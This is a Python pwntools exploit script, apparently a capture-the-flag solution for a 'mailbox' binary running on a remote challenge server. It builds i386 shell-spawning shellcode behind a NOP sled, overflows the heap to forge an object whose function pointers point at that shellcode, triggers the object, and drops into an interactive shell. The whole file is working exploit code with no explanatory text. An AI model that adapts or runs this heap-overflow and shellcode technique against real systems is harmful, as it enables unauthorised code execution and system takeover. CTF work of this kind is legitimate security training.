#!/usr/bin/env python
from pwn import *
from functools import wraps
import itertools
import time

context.log_level = 'DEBUG'
e = ELF('./mailbox')
r = None

def wrap(f):
    @wraps(f)
    def wrapped_f(*args, **kwargs):
        log.info('Called: ' + f.__name__ + repr(args))
        return f(*args, **kwargs)
    return wrapped_f

@wrap
def new_cust(name):
    r.sendline('N')
    r.sendline(name)
    r.recvuntil('Choice: ')




def alloc(index, size, payload):
    assert len(payload) == size #enforced by program
    item = p32(1)
    item += p32(0) #some sort of switch -> gives different function pointers
    item += p32(index)
    item += p32(size)
    r.send(item)
    time.sleep(0.1)
    r.send(payload)
    time.sleep(0.1)
    r.recvuntil("id ")
    res = int(r.recvuntil("\n").strip(), 16)
    print(hex(res))
    return res

def print_item(i):
    item = p32(0)
    item += p32(2015)
    item += p32(i)
    item += p32(2000)
    r.sendline(item)

def del_obj():
    pass

LOCAL = False

def main():
    global r
    env = { }
    if LOCAL:
        r = process('./mailbox', env=env)
        #gdb.attach(r, '''b *0x08048c89
        #c'''.format())
    
    else:
        r = remote("challenge.acictf.com", 31811)

    payload = "\x90" * 16 + asm(shellcraft.i386.linux.sh())

    #payload = "\xcc" * len(payload)

    id1 = alloc(0, 64, payload + "Q"*(64 - len(payload)))
    win_addr = id1 + 0x24
    id2 = alloc(0, 64, "A"*64)
    id3 = alloc(0, 64, "A"*64)
    print(hex(id1), hex(id2), hex(id3), hex(win_addr))

    LIST_HEAD = 0x0804B0A4
    fake_object = p32(LIST_HEAD)
    fake_object += p32(id3)
    fake_object += p32(0x42424242) # fake id
    fake_object += p32(32) #second input
    fake_object += p32(64) #length
    fake_object += p32(win_addr) * 3 #overwrites function ptrs
    overwrite = (id3 - id2 - 0x20) * "Z" + fake_object

    test = alloc(id2, len(overwrite), overwrite)

    print_item(0x42424242)

    r.interactive()

if __name__ == '__main__':
    main()
